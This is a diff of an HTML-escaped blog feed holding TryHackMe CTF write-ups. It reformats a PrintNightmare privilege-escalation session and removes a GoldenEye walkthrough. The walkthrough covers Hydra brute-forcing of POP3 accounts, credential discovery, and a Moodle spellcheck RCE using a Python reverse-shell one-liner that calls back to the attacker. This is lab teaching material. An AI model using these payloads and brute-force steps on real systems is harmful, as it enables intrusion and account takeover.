-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
 Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
 
                                                              
-&lt;span class=&quot;k&quot;&gt;Data&lt;/span&gt;: 238080 bytes of 238080 bytes copied
+Data: 238080 bytes of 238080 bytes copied
 
 Info: Upload successful!
 
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;default new user: adm1n
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;default new password: P@ssw0rd
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;pDriverPath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] added user  as &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;administrator
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] deleting payload &lt;span class=&quot;k&quot;&gt;from &lt;/span&gt;C:\Users\tony\AppData\Local\Temp\nightmare.dll&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = &quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;It worked! I canceled my current WinRM session and logged back in using the new credentials.&lt;/p&gt;
 
@@ -2231,577 +2452,6 @@ stux@ubuntu:~$ sudo /usr/local/bin/exiftool exploit.djvu
 root@ubuntu:~# whoami
 root
 root@ubuntu:~# hostname
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;
-
-&lt;p&gt;============================================================&lt;/p&gt;
-
-&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="medium" /><summary type="html"></summary></entry><entry><title type="html">GoldenEye Write Up</title><link href="https://darrynbrownfield.co.uk/goldeneye" rel="alternate" type="text/html" title="GoldenEye Write Up" /><published>2021-06-27T00:00:00+00:00</published><updated>2021-06-27T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/goldeneye</id><content type="html" xml:base="https://darrynbrownfield.co.uk/goldeneye">&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/goldeneye&quot;&gt;goldeneye&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. The machine was pretty easy, it just needed good enumeration.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and started a NMAP scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:39 BST
-Nmap scan report for 10.10.50.94
-Host is up (0.031s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-25/tcp open  smtp    Postfix smtpd
-|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
-|_ssl-date: TLS randomness does not represent time
-80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: GoldenEye Primary Admin Server
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 42.44 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;25 - smtp - Postfix smtpd&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache httpd 2.4.7&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I ran a full port scan and found 2 more ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/allports 10.10.50.94
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:40 BST
-Nmap scan report for 10.10.50.94
-Host is up (0.034s latency).
-Not shown: 65531 closed ports
-PORT      STATE SERVICE
-25/tcp    open  smtp
-80/tcp    open  http
-55006/tcp open  unknown
-55007/tcp open  unknown
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I then completed a targeted scan against the 4 ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p 25,80,55006,55007 -sC -sV -oA nmap/targeted 10.10.50.94
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:54 BST
-Nmap scan report for 10.10.50.94
-Host is up (0.030s latency).
-
-PORT      STATE SERVICE     VERSION
-25/tcp    open  smtp        Postfix smtpd
-|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
-|_ssl-date: TLS randomness does not represent time
-80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: GoldenEye Primary Admin Server
-55006/tcp open  ssl/unknown
-|_ssl-date: TLS randomness does not represent time
-55007/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: UIDL USER RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA STLS PIPELINING TOP
-|_ssl-date: TLS randomness does not represent time
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 109.38 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
-
-&lt;p&gt;I started by looking at the HTTP port.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The webpage tells us to go to /sev-home/ however the page is password protected and currently I have no usernames or password.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/loginprompt.png&quot; alt=&quot;loginprompt&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I checked the source code for the webpage.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;html&amp;gt;
-&amp;lt;head&amp;gt;
-&amp;lt;title&amp;gt;GoldenEye Primary Admin Server&amp;lt;/title&amp;gt;
-&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;index.css&quot;&amp;gt;
-&amp;lt;/head&amp;gt;
-
-	&amp;lt;span id=&quot;GoldenEyeText&quot; class=&quot;typeing&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;span class='blinker'&amp;gt;&amp;amp;#32;&amp;lt;/span&amp;gt;
-
-&amp;lt;script src=&quot;terminal.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-	
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Not a great deal in there but there is a javascript file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;var data = [
-  {
-    GoldenEyeText: &quot;&amp;lt;span&amp;gt;&amp;lt;br/&amp;gt;Severnaya Auxiliary Control Station&amp;lt;br/&amp;gt;****TOP SECRET ACCESS****&amp;lt;br/&amp;gt;Accessing Server Identity&amp;lt;br/&amp;gt;Server Name:....................&amp;lt;br/&amp;gt;GOLDENEYE&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;User: UNKNOWN&amp;lt;br/&amp;gt;&amp;lt;span&amp;gt;Naviagate to /sev-home/ to login&amp;lt;/span&amp;gt;&quot;
-  }
-];
-
-//
-//Boris, make sure you update your default password. 
-//My sources say MI6 maybe planning to infiltrate. 
-//Be on the lookout for any suspicious network traffic....
-//
-//I encoded you p@ssword below...
-//
-//&amp;amp;#73;&amp;amp;#110;&amp;amp;#118;&amp;amp;#105;&amp;amp;#110;&amp;amp;#99;&amp;amp;#105;&amp;amp;#98;&amp;amp;#108;&amp;amp;#101;&amp;amp;#72;&amp;amp;#97;&amp;amp;#99;&amp;amp;#107;&amp;amp;#51;&amp;amp;#114;
-//
-//BTW Natalya says she can break your codes
-//
-
-var allElements = document.getElementsByClassName(&quot;typeing&quot;);
-for (var j = 0; j &amp;lt; allElements.length; j++) {
-  var currentElementId = allElements[j].id;
-  var currentElementIdContent = data[0][currentElementId];
-  var element = document.getElementById(currentElementId);
-  var devTypeText = currentElementIdContent;
-
- 
-  var i = 0, isTag, text;
-  (function type() {
-    text = devTypeText.slice(0, ++i);
-    if (text === devTypeText) return;
-    element.innerHTML = text + `&amp;lt;span class='blinker'&amp;gt;&amp;amp;#32;&amp;lt;/span&amp;gt;`;
-    var char = text.slice(-1);
-    if (char === &quot;&amp;lt;&quot;) isTag = true;
-    if (char === &quot;&amp;gt;&quot;) isTag = false;
-    if (isTag) return type();
-    setTimeout(type, 60);
-  })();
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Few things to note in here, we have 2 names (boris, natalya) and an encoded password. I went to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;Cyber Chef&lt;/a&gt; to decode the password. Using the magic function the string is decoded from HTLM Entity to clear text.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/cyberchefjscode.png&quot; alt=&quot;cyberchefjscode&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Using the the username ‘boris’ and password from cyberchef I can now login to the webpage.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/loggedinwebpage.png&quot; alt=&quot;loggedinwebpage&quot; /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)&lt;/p&gt;
-
-  &lt;p&gt;Please email a qualified GNO supervisor to receive the online &lt;strong&gt;GoldenEye Operators Training&lt;/strong&gt; to become an Administrator of the GoldenEye system&lt;/p&gt;
-
-  &lt;p&gt;Remember, since &lt;strong&gt;&lt;em&gt;security by obscurity&lt;/em&gt;&lt;/strong&gt; is very effective, we have configured our pop3 service to run on a very high non-default port&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Its now time to turn attention to the smtp/pop3 ports.&lt;/p&gt;
-
-&lt;h3 id=&quot;email-enumeration&quot;&gt;Email Enumeration&lt;/h3&gt;
-
-&lt;p&gt;Reviewing the nmap output, port 25 SMTP allows the VRFY command however not AUTH. Port 55007 POP3 does allow authentication, I tried to login using the credentials found for boris but they didnt work.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/pop3boris.png&quot; alt=&quot;pop3boris&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Using Hydra I was able to brute force boris’s password.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Normaly I would use rockyou.txt however after around 30 minutes I had no hits so swapped to the much smaller wordlist fasttrack and got a hit after a minute or so.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:00:47
-[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3://10.10.50.94:55007/
-[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
-[55007][pop3] host: 10.10.50.94   login: boris   password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:03:34
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I repeated the process for natalya.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:05:44
-[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3://10.10.50.94:55007/
-[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[55007][pop3] host: 10.10.50.94   login: natalya   password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:07:45
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now I had some credentials it was time to login and check for any email messages, to do this I used netcat to connect to the POP3 service and authentication and use the ‘LIST’ and ‘RETR’ commands to list and retrieve messages.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;A list of POP3 commands can be found &lt;a href=&quot;https://www.shellhacks.com/retrieve-email-pop3-server-command-line/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
-+OK GoldenEye POP3 Electronic-Mail System
-USER boris
-+OK
-PASS &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-+OK Logged in.
-list
-+OK 3 messages:
-1 544
-2 373
-3 921
-.
-RETR 1
-+OK 544 octets
-Return-Path: &amp;lt;root@127.0.0.1.goldeneye&amp;gt;
-X-Original-To: boris
-Delivered-To: boris@ubuntu
-Received: from ok (localhost [127.0.0.1])
-        by ubuntu (Postfix) with SMTP id D9E47454B1
-        for &amp;lt;boris&amp;gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-Message-Id: &amp;lt;20180425022326.D9E47454B1@ubuntu&amp;gt;
-Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-From: root@127.0.0.1.goldeneye
-
-Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the ot
-her admins here.
-.
-RETR 2
-+OK 373 octets
-Return-Path: &amp;lt;natalya@ubuntu&amp;gt;
-X-Original-To: boris
-Delivered-To: boris@ubuntu
-Received: from ok (localhost [127.0.0.1])
-        by ubuntu (Postfix) with ESMTP id C3F2B454B1
-        for &amp;lt;boris&amp;gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
-Message-Id: &amp;lt;20180425024249.C3F2B454B1@ubuntu&amp;gt;
-Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
-From: natalya@ubuntu
-
-Boris, I can break your codes!
-.
-RETR 3
-+OK 921 octets
-Return-Path: &amp;lt;alec@janus.boss&amp;gt;
-X-Original-To: boris
-Delivered-To: boris@ubuntu
-Received: from janus (localhost [127.0.0.1])
-        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
-        for &amp;lt;boris&amp;gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-Message-Id: &amp;lt;20180425025235.4B9F4454B1@ubuntu&amp;gt;
-Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-From: alec@janus.boss
-
-Boris,
-
-Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this s
-erver then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and capture
-d our plan will crash and burn!
-
-Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
-
-PS - Keep security tight or we will be compromised.
-
-.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I repeated the same process for natalya.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
-+OK GoldenEye POP3 Electronic-Mail System
-user natalya
-+OK
-pass &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-+OK Logged in.
-list
-+OK 2 messages:
-1 631
-2 1048
-.
-retr 1
-+OK 631 octets
-Return-Path: &amp;lt;root@ubuntu&amp;gt;
-X-Original-To: natalya
-Delivered-To: natalya@ubuntu
-Received: from ok (localhost [127.0.0.1])
-        by ubuntu (Postfix) with ESMTP id D5EDA454B1
-        for &amp;lt;natalya&amp;gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
-Message-Id: &amp;lt;20180425024542.D5EDA454B1@ubuntu&amp;gt;
-Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
-From: root@ubuntu
-
-Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
-
-Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
-.
-RETR 2
-+OK 1048 octets
-Return-Path: &amp;lt;root@ubuntu&amp;gt;
-X-Original-To: natalya
-Delivered-To: natalya@ubuntu
-Received: from root (localhost [127.0.0.1])
-        by ubuntu (Postfix) with SMTP id 17C96454B1
-        for &amp;lt;natalya&amp;gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
-Message-Id: &amp;lt;20180425031956.17C96454B1@ubuntu&amp;gt;
-Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
-From: root@ubuntu
-
-Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even
- if it's not, just enter it in under the guise of &quot;security&quot;...it'll get the change order escalated without much hassle :)
-
-Ok, user creds are:
-
-username: xenia
-password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-
-Boris verified her as a valid contractor so just create the account ok?
-
-And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
-**Make sure to edit your host file since you usually work remote off-network....
-
-Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
-
-
-.
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great more credentials and a new HTTP endpoint. I added the details to my /etc/hosts file and navigated to http://severnaya-station.com/gnocertdir/&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/moodle.png&quot; alt=&quot;moodle&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Logging in as xenia a message notification popped up, using the notification I was navigated to the users messages.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/xeniamessage.png&quot; alt=&quot;xeniamessage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A new email username is ‘doak’&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:16:54
-[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3://10.10.50.94:55007/
-[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
-[55007][pop3] host: 10.10.50.94   login: doak   password: goat
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:19:23
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Repeating the same process as before, I brute forced the users password and logged in to POP3 service to check for messages.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
-+OK GoldenEye POP3 Electronic-Mail System
-user doak
-+OK
-pass &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-+OK Logged in.
-list
-+OK 1 messages:
-1 606
-.
-RETR 1
-+OK 606 octets
-Return-Path: &amp;lt;doak@ubuntu&amp;gt;
-X-Original-To: doak
-Delivered-To: doak@ubuntu
-Received: from doak (localhost [127.0.0.1])
-        by ubuntu (Postfix) with SMTP id 97DC24549D
-        for &amp;lt;doak&amp;gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
-Message-Id: &amp;lt;20180425034731.97DC24549D@ubuntu&amp;gt;
-Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
-From: doak@ubuntu
-
-James,
-If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
-
-Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
-
-username: dr_doak
-password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
-
-.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I logged out of http://severnaya-station.com/gnocertdir/ as xenia and logged in as dr_doak. Looking around the webpage I found private files for james.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/privatefiles.png&quot; alt=&quot;privatefiles&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I downloaded the file to my machine.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat s3cret.txt 
-007,
-
-I was able to capture this apps adm1n cr3ds through clear txt. 
-
-Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
-
-Something juicy is located here: /dir007key/for-007.jpg
-
-Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Navigating to http://severnaya-station.com/dir007key/for-007.jpg I found an image:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/for-007.jpg&quot; alt=&quot;007&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I downloaded the file and used exiftools to check for any credentials.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $exiftool for-007.jpg 
-ExifTool Version Number         : 11.97
-File Name                       : for-007.jpg
-Directory                       : .
-File Size                       : 15 kB
-File Modification Date/Time     : 2021:06:27 12:27:18+01:00
-File Access Date/Time           : 2021:06:27 12:27:18+01:00
-File Inode Change Date/Time     : 2021:06:27 12:27:18+01:00
-File Permissions                : rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-X Resolution                    : 300
-Y Resolution                    : 300
-Exif Byte Order                 : Big-endian (Motorola, MM)
-Image Description               : eFdpbnRlcjE5OTV4IQ==
-Make                            : GoldenEye
-Resolution Unit                 : inches
-Software                        : linux
-Artist                          : For James
-Y Cb Cr Positioning             : Centered
-Exif Version                    : 0231
-Components Configuration        : Y, Cb, Cr, -
-User Comment                    : For 007
-Flashpix Version                : 0100
-Image Width                     : 313
-Image Height                    : 212
-Encoding Process                : Baseline DCT, Huffman coding
-Bits Per Sample                 : 8
-Color Components                : 3
-Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
-Image Size                      : 313x212
-Megapixels                      : 0.066
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The image description looks like base64 so using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -n &quot;eFdpbnRlcjE5OTV4IQ==&quot; | base64 -d&lt;/code&gt; I was able to retrieve the admin password.&lt;/p&gt;
-
-&lt;h3 id=&quot;shell&quot;&gt;Shell&lt;/h3&gt;
-
-&lt;p&gt;As an admin on moodle we get a lot more options, the moodle version is 2.2.3, googleing for ‘moodle 2.2.3 exploit’, the first result provides an &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/&quot;&gt;exploit&lt;/a&gt; using the spell check function. Reading the source code it looks fairly straight forward so I decided to do manualy rather than use Metasploit.&lt;/p&gt;
-
-&lt;p&gt;First I updated the system path with the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;&amp;lt;local machine IP&amp;gt;&amp;gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/systempath.png&quot; alt=&quot;systempath&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Next I changed the shell engine to use ‘PSpellShell’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/updatedshell.png&quot; alt=&quot;updatedshell&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I started a netcat listener on my local machine and then on the webpage went to add a post, once the editor loaded and clicked spell check and got a shell!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/spellcheck.png&quot; alt=&quot;spellcheck&quot; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [&amp;lt;&amp;lt;REDACTED&amp;gt;&amp;gt;] from (UNKNOWN) [10.10.50.94] 55215
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
